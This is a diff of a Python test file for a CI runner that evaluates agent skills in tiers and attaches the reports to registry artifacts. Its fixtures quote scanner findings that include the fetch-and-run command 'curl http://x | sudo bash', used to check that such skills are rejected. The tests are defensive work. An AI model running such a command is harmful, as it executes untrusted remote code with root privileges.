@@ -35,17 +35,26 @@ def validator(
     findings: list[dict] | None = None,
     errors: list[str] | None = None,
     incomplete: list[str] | None = None,
+    tier: int = 1,
+    skip_reason: str | None = None,
 ) -> dict:
-    """Build one ``results[]`` entry of a SkillEvaluator JSON report."""
+    """Build one ``results[]`` entry of a SkillEvaluator ``validate`` JSON report."""
     return {
         "validator": check.title(),
         "status": status,
-        "passed": status == "passed",
-        "skipped": False,
+        "passed": status in ("passed", "skipped"),
+        "skipped": status == "skipped",
+        "skip_reason": skip_reason,
         "incomplete_scans": incomplete or [],
         "findings": findings or [],
         "legacy": {"errors": errors or [], "warnings": [], "messages": []},
-        "publication_evidence": {"producer": "skillevaluator.tier1", "tier": 1, "check_id": check},
+        "gating": {"tier": tier, "blocking": True},
+        "publication_evidence": {
+            "schema_version": 1,
+            "producer": f"skillevaluator.tier{tier}",
+            "tier": tier,
+            "check_id": check,
+        },
     }
 
 
@@ -60,16 +69,53 @@ def finding(rule: str, message: str, path: str = "scripts/x.sh", line: int = 5, 
     }
 
 
-def report(status: str, results: list[dict] | None = None) -> dict:
-    """Build a SkillEvaluator JSON report with the given ``overall_status``."""
+def report(*results: dict, publication: str | None = None) -> dict:
+    """Build a ``validate`` JSON report; ``publication`` defaults to what its results imply."""
+    failed = any(r["status"] == "failed" for r in results)
     return {
-        "overall_status": status,
-        "overall_passed": status == "passed",
-        "results": results or [],
+        "overall_status": "failed" if failed else "passed",
+        "results": list(results),
+        "publication": {"status": publication or ("fail" if failed else "pass")},
     }
 
 
-PASS = report("passed", [validator("schema")])
+PASS = report(validator("schema"), validator("similarity", tier=2))
+
+
+def with_publication(content: dict, status: str) -> dict:
+    """Return ``content`` with SkillEvaluator's publication status replaced."""
+    return {**content, "publication": {"status": status}}
+
+
+TIER2_FAILED = report(
+    validator("schema"),
+    validator(
+        "similarity",
+        "failed",
+        [finding("EXACT_DUPLICATE", "matches 'other'", "acme", 0)],
+        tier=2,
+    ),
+)
+SCANNER_MISSING = report(
+    validator(
+        "security",
+        "incomplete",
+        errors=["[SECURITY-HIGH] skillspector did not complete"],
+        incomplete=["skillspector"],
+    ),
+    validator("similarity", tier=2),
+    publication="incomplete",
+)
+TIER2_SKIPPED = report(
+    validator("schema"),
+    validator(
+        "context-optimization",
+        "skipped",
+        tier=2,
+        skip_reason="Tier 2 skipped: embedding setup is required.\nmore",
+    ),
+    publication="incomplete",
+)
 GOOD = {"agents": {"claude-code": agent_entry(0.951, 0.364)}}
 REPORT = "sha256:" + "c" * 64
 TIERS_OK = {"tier1": "passed", "tier2": "passed", "tier3": "passed"}
@@ -86,29 +132,32 @@ GOOD_PAYLOAD = {
 }
 NO_REPORT = {k: v for k, v in GOOD_PAYLOAD.items() if k != "report"}
 CURL_BASH = report(
-    "failed",
-    [
-        validator(
-            "security",
-            "failed",
-            [
-                finding("Chaining Abuse (TM2)", "Tool Misuse: | sudo", sev="high"),
-                finding("Unknown (LP3)", "opaque intent", "SKILL.md", 1, sev="medium"),
-                finding("External Script Fetching (SC2)", "curl http://x | sudo bash", sev="high"),
-            ],
-        )
-    ],
+    validator(
+        "security",
+        "failed",
+        [
+            finding("Chaining Abuse (TM2)", "Tool Misuse: | sudo", sev="high"),
+            finding("Unknown (LP3)", "opaque intent", "SKILL.md", 1, sev="medium"),
+            finding("External Script Fetching (SC2)", "curl http://x | sudo bash", sev="high"),
+        ],
+    ),
+    validator("similarity", tier=2),
 )
 
 
 class FakeRun:
-    """Stands in for subprocess.run: fakes oras and skillevaluator."""
+    """Stands in for subprocess.run: fakes oras and skillevaluator.
+
+    ``gate`` is the report of ``validate --tiers 1,2``, ``full`` the report of the run with
+    Tier 3. Like SkillEvaluator, a report holds only the tiers that were selected, and its
+    publication is ``incomplete`` unless all three ran (``None`` writes no report at all).
+    """
 
     def __init__(
         self,
         result: Any = GOOD,
-        tier1: Any = PASS,
-        tier2: Any = PASS,
+        gate: Any = PASS,
+        full: Any = PASS,
         eval_exit: int = 0,
         pull_exit: int = 0,
         skill_dir: bool = True,
@@ -116,13 +165,12 @@ class FakeRun:
         repos: list[str] | None = None,
         tags: dict[str, list[str]] | None = None,
         catalog_exit: int = 0,
-        tier2_exit: int = 0,
         attach_failures: int = 0,
     ):
         self.attach_failures = attach_failures  # attach calls that fail before one succeeds
         self.result = result
-        self.tier1 = tier1
-        self.tier2 = tier2
+        self.gate = gate
+        self.full = full
         self.eval_exit = eval_exit
         self.pull_exit = pull_exit
         self.skill_dir = skill_dir
@@ -130,33 +178,30 @@ class FakeRun:
         self.repos = repos if repos is not None else []
         self.tags = tags or {}
         self.catalog_exit = catalog_exit
-        self.tier2_exit = tier2_exit
         self.calls: list[list[str]] = []
         self.envs: dict[str, dict[str, str]] = {}
         self.attach_cwd: Path | None = None
         self.bundle: list[str] = []
+        self.bundle_text: dict[str, str] = {}
 
     def names(self) -> list[str]:
         """Return the ``oras``/``skillevaluator`` sub-commands that ran, in order."""
         return [" ".join(c[:3] if c[0] == "oras" else c[:2]) for c in self.calls]
 
-    def tier3_ran(self) -> bool:
-        """Return whether ``tier3 evaluate`` was called."""
-        return any(c[:3] == ["skillevaluator", "tier3", "evaluate"] for c in self.calls)
+    def validates(self) -> list[list[str]]:
+        """Return the ``skillevaluator validate`` command lines, in order."""
+        return [c for c in self.calls if c[:2] == ["skillevaluator", "validate"]]
 
-    @staticmethod
-    def write_report(directory: Path, name: str, content: Any) -> None:
-        """Write ``name``.json and ``name``.html into ``directory``."""
-        directory.mkdir(parents=True, exist_ok=True)
-        text = content if isinstance(content, str) else json.dumps(content)
-        (directory / f"{name}.json").write_text(text)
-        (directory / f"{name}.html").write_text("<html></html>")
+    def tier3_ran(self) -> bool:
+        """Return whether a ``validate`` run selected Tier 3."""
+        return any("3" in c[c.index("--tiers") + 1].split(",") for c in self.validates())
 
     def oras(self, cmd: list[str], kwargs: dict[str, Any]) -> subprocess.CompletedProcess:
         """Fake the oras sub-commands the runner uses."""
         if cmd[1] == "attach":
             self.attach_cwd = kwargs.get("cwd")
             self.bundle = sorted(p.name for p in Path(kwargs["cwd"]).iterdir())
+            self.bundle_text = {p.name: p.read_text() for p in Path(kwargs["cwd"]).iterdir()}
             if self.attach_failures > 0:
                 self.attach_failures -= 1
                 return subprocess.CompletedProcess(cmd, 1, "", "HEAD manifests: status code 502")
@@ -180,33 +225,42 @@ class FakeRun:
         (dest / name / "SKILL.md").write_text("---\nname: x\n---\n")
         return subprocess.CompletedProcess(cmd, 0, "", "")
 
-    def __call__(self, cmd: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
-        self.calls.append(cmd)
-        if cmd[0] == "oras":
-            return self.oras(cmd, kwargs)
-        sub = cmd[1]
-        if "env" in kwargs:
-            self.envs[sub] = kwargs["env"]
-        if sub == "validate":
-            self.write_report(Path(cmd[cmd.index("-o") + 1]), "skillevaluator-output-1", self.tier1)
-            return subprocess.CompletedProcess(cmd, 0 if self.tier1 is PASS else 1, "", "")
-        if sub == "similarity-check":
-            if not self.catalog_exit:
-                Path(cmd[cmd.index("--save-catalog") + 1]).write_text("{}")
-            return subprocess.CompletedProcess(cmd, self.catalog_exit, "", "embedding failed")
-        if sub == "tier2":
-            if self.tier2 is not None:
-                out = Path(cmd[cmd.index("-o") + 1])
-                self.write_report(out, "skillevaluator-tier2", self.tier2)
-            return subprocess.CompletedProcess(cmd, self.tier2_exit, "", "provider error\nboom")
-        # tier3 evaluate
-        if self.result is not None:
+    def validate(self, cmd: list[str]) -> subprocess.CompletedProcess:
+        """Fake ``skillevaluator validate``: write the combined report and, with Tier 3, scores."""
+        selected = set(cmd[cmd.index("--tiers") + 1].split(","))
+        with_tier3 = "3" in selected
+        content = self.full if with_tier3 else self.gate
+        if with_tier3 and self.result is not None:
             run_dir = Path(cmd[cmd.index("--results-dir") + 1]) / "acme" / "20260101_000000"
             run_dir.mkdir(parents=True)
             text = self.result if isinstance(self.result, str) else json.dumps(self.result)
             (run_dir / "result.json").write_text(text)
-            (run_dir / "report.html").write_text("<html></html>")
-        return subprocess.CompletedProcess(cmd, self.eval_exit)
+            (run_dir / "report.html").write_text("<html>tier 3</html>")
+        if content is None:
+            return subprocess.CompletedProcess(cmd, 1, "", "provider error\nboom")
+        results = [r for r in content["results"] if str(r["gating"]["tier"]) in selected]
+        publication = dict(content["publication"])
+        if selected != {"1", "2", "3"} and publication["status"] == "pass":
+            publication["status"] = "incomplete"
+        out = Path(cmd[cmd.index("-o") + 1])
+        out.mkdir(parents=True, exist_ok=True)
+        text = json.dumps({**content, "results": results, "publication": publication})
+        (out / "skillevaluator-output-1.json").write_text(text)
+        (out / "skillevaluator-output-1.html").write_text("<html>combined</html>")
+        (out / "BENCHMARK.md").write_text("# benchmark")
+        return subprocess.CompletedProcess(cmd, self.eval_exit if with_tier3 else 0, "", "")
+
+    def __call__(self, cmd: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
+        self.calls.append(cmd)
+        if cmd[0] == "oras":
+            return self.oras(cmd, kwargs)
+        if "env" in kwargs:
+            self.envs[cmd[1]] = kwargs["env"]
+        if cmd[1] == "similarity-check":
+            if not self.catalog_exit:
+                Path(cmd[cmd.index("--save-catalog") + 1]).write_text("{}")
+            return subprocess.CompletedProcess(cmd, self.catalog_exit, "", "embedding failed")
+        return self.validate(cmd)
 
 
 @pytest.fixture(autouse=True)
@@ -293,7 +347,7 @@ def test_main(name, fake, code, expected, termination, monkeypatch):
     [
         (
             "tier 1 fails on curl piped to bash",
-            FakeRun(GOOD, tier1=CURL_BASH),
+            FakeRun(GOOD, gate=CURL_BASH),
             {"tier1": "failed", "tier2": "passed", "tier3": "skipped"},
             "failed",
             [
@@ -304,49 +358,31 @@ def test_main(name, fake, code, expected, termination, monkeypatch):
         ),
         (
             "tier 2 fails on a duplicate",
-            FakeRun(
-                GOOD,
-                tier2=report(
-                    "failed",
-                    [
-                        validator(
-                            "similarity",
-                            "failed",
-                            [finding("EXACT_DUPLICATE", "matches 'other'", "acme", 0)],
-                        )
-                    ],
-                ),
-            ),
+            FakeRun(GOOD, gate=TIER2_FAILED),
             {"tier1": "passed", "tier2": "failed", "tier3": "skipped"},
             "failed",
             ["tier2/similarity: EXACT_DUPLICATE: matches 'other' (acme)"],
         ),
         (
             "tier 1 incomplete still runs tier 3",
-            FakeRun(
-                GOOD,
-                tier1=report(
-                    "incomplete",
-                    [
-                        validator(
-                            "security",
-                            "incomplete",
-                            errors=["[SECURITY-HIGH] skillspector did not complete"],
-                            incomplete=["skillspector"],
-                        )
-                    ],
-                ),
-            ),
+            FakeRun(GOOD, gate=SCANNER_MISSING, full=SCANNER_MISSING),
             {"tier1": "incomplete", "tier2": "passed", "tier3": "passed"},
             "incomplete",
             ["tier1/security: skillspector did not complete"],
         ),
         (
-            "tier 2 crash leaves no report",
-            FakeRun(GOOD, tier2=None, tier2_exit=1),
+            "tier 2 skipped by SkillEvaluator leaves tier 2 incomplete",
+            FakeRun(GOOD, gate=TIER2_SKIPPED, full=TIER2_SKIPPED),
             {"tier1": "passed", "tier2": "incomplete", "tier3": "passed"},
             "incomplete",
-            ["tier2/run: boom"],
+            ["tier2/context-optimization: Tier 2 skipped: embedding setup is required."],
+        ),
+        (
+            "validate crashes without a report",
+            FakeRun(GOOD, gate=None, full=None),
+            {"tier1": "incomplete", "tier2": "incomplete", "tier3": "passed"},
+            "incomplete",
+            ["tier1/run: boom"],
         ),
         (
             "tier 3 ran with failed trials",
@@ -355,8 +391,40 @@ def test_main(name, fake, code, expected, termination, monkeypatch):
             "incomplete",
             ["tier3/execution: trial 2"],
         ),
+        (
+            "neutral publication counts as passed",
+            FakeRun(GOOD, full=with_publication(PASS, "neutral")),
+            {"tier1": "passed", "tier2": "passed", "tier3": "passed"},
+            "passed",
+            [],
+        ),
+        (
+            "SkillEvaluator says incomplete although every tier passed",
+            FakeRun(GOOD, full=with_publication(PASS, "incomplete")),
+            {"tier1": "passed", "tier2": "passed", "tier3": "passed"},
+            "incomplete",
+            [],
+        ),
+        (
+            "SkillEvaluator says passed but tier 3 is incomplete",
+            FakeRun({**GOOD, "execution_status": "failed", "execution_errors": ["x"]}),
+            {"tier1": "passed", "tier2": "passed", "tier3": "incomplete"},
+            "incomplete",
+            ["tier3/execution: x"],
+        ),
+        (
+            "full run reports a tier 1 failure the gate missed",
+            FakeRun(GOOD, full=CURL_BASH),
+            {"tier1": "failed", "tier2": "passed", "tier3": "passed"},
+            "failed",
+            [
+                "tier1/security: Chaining Abuse (TM2): Tool Misuse: | sudo (scripts/x.sh:5)",
+                "tier1/security: External Script Fetching (SC2): curl http://x | sudo bash"
+                " (scripts/x.sh:5)",
+            ],
+        ),
     ],
-)
+)  # fmt: skip
 def test_tiers(name, fake, tiers, publication, findings, termination, monkeypatch):
     """Tier 3 runs unless Tier 1 or 2 failed; the message carries tiers and findings."""
     monkeypatch.setattr(skill_eval.subprocess, "run", fake)
@@ -371,49 +439,53 @@ def test_tiers(name, fake, tiers, publication, findings, termination, monkeypatc
         assert written["report"] == REPORT
 
 
-def test_rejected_run_attaches_the_failing_report(termination, monkeypatch):
-    """A skipped Tier 3 still attaches the static reports; report.html is the failing tier's."""
-    fake = FakeRun(GOOD, tier1=CURL_BASH)
+def test_rejected_run_spends_no_tier3_trials(termination, monkeypatch):
+    """A Rejected skill gets the gate run only: no Tier 3 command, no sandboxes."""
+    fake = FakeRun(GOOD, gate=CURL_BASH)
     monkeypatch.setattr(skill_eval.subprocess, "run", fake)
     assert skill_eval.main() == 0
-    assert fake.bundle == [
-        "report.html",
-        "result.json",
-        "tier1.html",
-        "tier1.json",
-        "tier2.html",
-        "tier2.json",
-    ]
+    (gate,) = fake.validates()
+    assert gate[gate.index("--tiers") + 1] == "1,2"
+    assert "--results-dir" not in gate
+
+
+def test_rejected_run_attaches_the_failing_report(termination, monkeypatch):
+    """A skipped Tier 3 still attaches the combined report of the gate run."""
+    fake = FakeRun(GOOD, gate=CURL_BASH)
+    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
+    assert skill_eval.main() == 0
+    assert fake.bundle == ["BENCHMARK.md", "report.html", "result.json"]
     attach = fake.calls[-1]
     assert "skillci.dev/publication=failed" in attach
     assert not any(a.startswith("skillci.dev/lift") for a in attach)
 
 
-def test_tier1_and_tier2_run_before_tier3(termination, monkeypatch):
-    """Static tiers get their commands and the provider environment; Tier 3 comes last."""
+def test_one_validate_covers_all_tiers(termination, monkeypatch):
+    """After the gate, one validate run (all tiers, catalog, Tier 3 options) gives the report."""
     fake = FakeRun(GOOD, repos=["skills/acme", "skills/other"], tags={"other": ["v1.0.0"]})
     monkeypatch.setattr(skill_eval.subprocess, "run", fake)
     assert skill_eval.main() == 0
     assert fake.names() == [
         "oras pull harbor.example/skills/acme@sha256:abc",
-        "skillevaluator validate",
         "oras repo ls",
         "oras repo tags",
         "oras pull harbor.example/skills/other:v1.0.0",
         "skillevaluator similarity-check",
-        "skillevaluator tier2",
-        "skillevaluator tier3",
+        "skillevaluator validate",
+        "skillevaluator validate",
         "oras attach --artifact-type",
     ]
-    tier1 = fake.calls[1]
-    assert tier1[2].endswith("/skills/acme")
-    for flag, value in [("--tiers", "1"), ("--profile", "external"), ("-r", "json,html")]:
-        assert tier1[tier1.index(flag) + 1] == value
-    assert "--no-llm" in tier1
-    tier2 = fake.calls[-3]
-    assert tier2[tier2.index("--catalog") + 1].endswith("/catalog.json")
+    gate, full = fake.validates()
+    for cmd, tiers in ((gate, "1,2"), (full, "1,2,3")):
+        assert cmd[2].endswith("/skills/acme")
+        for flag, value in [("--tiers", tiers), ("--profile", "external"), ("-r", "json,html")]:
+            assert cmd[cmd.index(flag) + 1] == value
+        assert "--no-llm" in cmd
+        assert cmd[cmd.index("--catalog") + 1].endswith("/catalog.json")
+    assert "--results-dir" not in gate
     assert fake.envs["validate"]["SKILL_EVAL_LLM_PROVIDER"] == "anthropic"
-    assert fake.envs["tier2"]["SKILL_EVAL_EMBEDDING_PROVIDER"] == "openai"
+    assert fake.envs["validate"]["SKILL_EVAL_EMBEDDING_PROVIDER"] == "openai"
+    assert fake.envs["similarity-check"]["SKILL_EVAL_EMBEDDING_PROVIDER"] == "openai"
 
 
 @pytest.mark.parametrize(
@@ -435,8 +507,8 @@ def test_catalog(name, repos, tags, pulled, termination, monkeypatch):
     assert skill_eval.main() == 0, name
     pulls = [c[2].split("/", 2)[2] for c in fake.calls if c[:2] == ["oras", "pull"]][1:]
     assert pulls == pulled
-    tier2 = next(c for c in fake.calls if c[:2] == ["skillevaluator", "tier2"])
-    assert ("--catalog" in tier2) == bool(pulled)
+    for cmd in fake.validates():
+        assert ("--catalog" in cmd) == bool(pulled)
     assert ("similarity-check" in {c[1] for c in fake.calls}) == bool(pulled)
 
 
@@ -455,14 +527,16 @@ def test_pick_tag(tags, expected):
 
 
 def test_catalog_build_failure_is_incomplete(termination, monkeypatch):
-    """A catalog that cannot be built leaves Tier 2 incomplete and does not stop Tier 3."""
+    """A catalog that cannot be built leaves Tier 2 out; Tier 3 still runs."""
     fake = FakeRun(GOOD, repos=["skills/a"], tags={"a": ["v1.0.0"]}, catalog_exit=1)
     monkeypatch.setattr(skill_eval.subprocess, "run", fake)
     assert skill_eval.main() == 0
     written = termination()
-    assert written["tiers"]["tier2"] == "incomplete"
+    assert written["tiers"] == {"tier1": "passed", "tier2": "incomplete", "tier3": "passed"}
+    assert written["publication"] == "incomplete"
     assert written["findings"] == ["tier2/catalog: embedding failed"]
-    assert written["tiers"]["tier3"] == "passed"
+    assert [c[c.index("--tiers") + 1] for c in fake.validates()] == ["1", "1,3"]
+    assert all("--catalog" not in c for c in fake.validates())
 
 
 def test_no_embeddings_provider(termination, monkeypatch):
@@ -473,14 +547,17 @@ def test_no_embeddings_provider(termination, monkeypatch):
     assert skill_eval.main() == 0
     written = termination()
     assert written["tiers"] == {"tier1": "passed", "tier2": "incomplete", "tier3": "passed"}
+    assert written["publication"] == "incomplete"
+    assert len(written["findings"]) == 1
     assert "OPENAI_API_KEY" in written["findings"][0]
-    assert "tier2" not in {c[1] for c in fake.calls}
+    assert [c[c.index("--tiers") + 1] for c in fake.validates()] == ["1", "1,3"]
+    assert "similarity-check" not in {c[1] for c in fake.calls}
 
 
 def test_findings_are_capped_and_short(termination, monkeypatch):
     """At most five findings of at most 200 characters, whatever the report holds."""
     many = [finding(f"Rule {i}", "x" * 500, f"f{i}.sh", i) for i in range(1, 9)]
-    fake = FakeRun(GOOD, tier1=report("failed", [validator("security", "failed", many)]))
+    fake = FakeRun(GOOD, gate=report(validator("security", "failed", many)))
     monkeypatch.setattr(skill_eval.subprocess, "run", fake)
     assert skill_eval.main() == 0
     findings = termination()["findings"]
@@ -502,25 +579,29 @@ def test_message_stays_under_4kb(termination, monkeypatch, tmp_path):
 
 
 def test_commands(termination, monkeypatch):
-    """oras and skillevaluator get the arguments the contract promises."""
+    """oras and the full validate run get the arguments the contract promises."""
     fake = FakeRun(GOOD)
     monkeypatch.setattr(skill_eval.subprocess, "run", fake)
     assert skill_eval.main() == 0
     oras = fake.calls[0]
-    evaluator = next(c for c in fake.calls if c[:3] == ["skillevaluator", "tier3", "evaluate"])
+    evaluator = fake.validates()[-1]
     assert oras[:3] == ["oras", "pull", ENV["SKILL_REF"]]
     assert "--plain-http" in oras
-    assert evaluator[3].endswith("/skills/acme")
+    assert evaluator[2].endswith("/skills/acme")
     for flag, value in [
+        ("--tiers", "1,2,3"),
         ("--agents", "claude-code"),
         ("--env-mode", "ack"),
         ("--agent-model", "claude-code=claude-haiku-5-5"),
         ("--n-attempts", "2"),
-        ("--override-cpus", "1"),
-        ("--override-memory-mb", "2048"),
         ("--n-concurrent", "2"),
     ]:
         assert evaluator[evaluator.index(flag) + 1] == value
+    assert "--no-autopilot" in evaluator
+    # validate has no --override-cpus/--override-memory-mb: the size travels in the environment.
+    assert not {"--override-cpus", "--override-memory-mb", "--progress"} & set(evaluator)
+    env = fake.envs["validate"]
+    assert (env["HARBOR_SANDBOX_CPUS"], env["HARBOR_SANDBOX_MEMORY_MB"]) == ("1", "2048")
     eks = [evaluator[i + 1] for i, arg in enumerate(evaluator) if arg == "--ek"]
     assert eks == [
         "namespace=skill-ci",
@@ -530,8 +611,19 @@ def test_commands(termination, monkeypatch):
     ]
 
 
+def test_sandbox_size_follows_the_job_env(termination, monkeypatch):
+    """SANDBOX_CPUS and SANDBOX_MEMORY_MB from the Job become the sandbox size variables."""
+    monkeypatch.setenv("SANDBOX_CPUS", "2")
+    monkeypatch.setenv("SANDBOX_MEMORY_MB", "3072")
+    fake = FakeRun(GOOD)
+    monkeypatch.setattr(skill_eval.subprocess, "run", fake)
+    assert skill_eval.main() == 0
+    env = fake.envs["validate"]
+    assert (env["HARBOR_SANDBOX_CPUS"], env["HARBOR_SANDBOX_MEMORY_MB"]) == ("2", "3072")
+
+
 def test_attach_command(termination, monkeypatch):
-    """The reports of all tiers are attached to the evaluated digest as a typed referrer."""
+    """The combined report and the Tier 3 files are attached as a typed referrer."""
     fake = FakeRun(GOOD)
     monkeypatch.setattr(skill_eval.subprocess, "run", fake)
     assert skill_eval.main() == 0
@@ -549,13 +641,15 @@ def test_attach_command(termination, monkeypatch):
     assert attach[subject + 1 :] == [
         "report.html:text/html",
         "result.json:application/json",
-        "tier1.html:text/html",
-        "tier1.json:application/json",
-        "tier2.html:text/html",
-        "tier2.json:application/json",
+        "BENCHMARK.md:text/markdown",
+        "validate.json:application/json",
+        "tier3.html:text/html",
     ]
     assert fake.attach_cwd is not None
     assert fake.attach_cwd.name == "bundle"
+    assert "combined" in fake.bundle_text["report.html"]
+    assert "tier 3" in fake.bundle_text["tier3.html"]
+    assert "agents" in json.loads(fake.bundle_text["result.json"])  # the Tier 3 result
 
 
 def test_termination_message_with_report_fits(tmp_path):
@@ -581,17 +675,43 @@ def test_bad_config(env, message):
 
 
 @pytest.mark.parametrize(
-    ("tiers", "expected"),
+    ("status", "expected"),
     [
-        ({"tier1": "passed", "tier2": "passed", "tier3": "passed"}, "passed"),
-        ({"tier1": "incomplete", "tier2": "passed", "tier3": "passed"}, "incomplete"),
-        ({"tier1": "passed", "tier2": "passed", "tier3": "skipped"}, "incomplete"),
-        ({"tier1": "failed", "tier2": "incomplete", "tier3": "skipped"}, "failed"),
+        ("pass", "passed"),
+        ("neutral", "passed"),
+        ("fail", "failed"),
+        ("incomplete", "incomplete"),
+        ("surprise", "incomplete"),
+        (None, "incomplete"),
     ],
 )
-def test_publication_status(tiers, expected):
-    """Publication fails on any failed tier and passes only when every tier passed."""
-    assert skill_eval.publication_status(tiers) == expected
+def test_publication_of(status, expected):
+    """SkillEvaluator's publication.status is mapped; unknown values never read as passed."""
+    content = {} if status is None else {"publication": {"status": status}}
+    assert skill_eval.publication_of(content) == expected
+
+
+def test_publication_of_older_field():
+    """A report with only the flat publication_status is still understood."""
+    assert skill_eval.publication_of({"publication_status": "pass"}) == "passed"
+
+
+@pytest.mark.parametrize(
+    ("results", "expected"),
+    [
+        ([validator("a"), validator("b")], "passed"),
+        ([validator("a"), validator("b", "failed")], "failed"),
+        ([validator("a", "incomplete"), validator("b", "failed")], "failed"),
+        ([validator("a"), validator("b", "incomplete")], "incomplete"),
+        ([validator("a", incomplete=["semgrep"])], "incomplete"),
+        ([validator("a", "skipped")], "incomplete"),
+        ([validator("a"), validator("b", "skipped")], "passed"),
+        ([], "incomplete"),
+    ],
+)
+def test_tier_status(results, expected):
+    """A tier fails on any failed check and is incomplete without trustworthy evidence."""
+    assert skill_eval.tier_status({"results": results}, 1) == expected
 
 
 def test_truncated_message(tmp_path):
@@ -617,9 +737,9 @@ def test_secrets_are_redacted(termination, monkeypatch):
 
 def test_secrets_are_redacted_from_findings(termination, monkeypatch):
     """A key that a scanner echoes into a finding is removed from the message."""
-    leak = report("failed", [validator("pii", "failed", [finding("Key", "found sk-leak-123")])])
+    leak = report(validator("pii", "failed", [finding("Key", "found sk-leak-123")]))
     monkeypatch.setenv("OPENAI_API_KEY", "sk-leak-123")
-    monkeypatch.setattr(skill_eval.subprocess, "run", FakeRun(GOOD, tier1=leak))
+    monkeypatch.setattr(skill_eval.subprocess, "run", FakeRun(GOOD, gate=leak))
     assert skill_eval.main() == 0
     assert "sk-leak-123" not in json.dumps(termination())
 
@@ -650,4 +770,4 @@ def test_tier3_names_the_llm_provider(termination, monkeypatch):
     fake = FakeRun(GOOD)
     monkeypatch.setattr(skill_eval.subprocess, "run", fake)
     assert skill_eval.main() == 0
-    assert fake.envs["tier3"]["SKILL_EVAL_LLM_PROVIDER"] == "anthropic"
+    assert fake.envs["validate"]["SKILL_EVAL_LLM_PROVIDER"] == "anthropic"
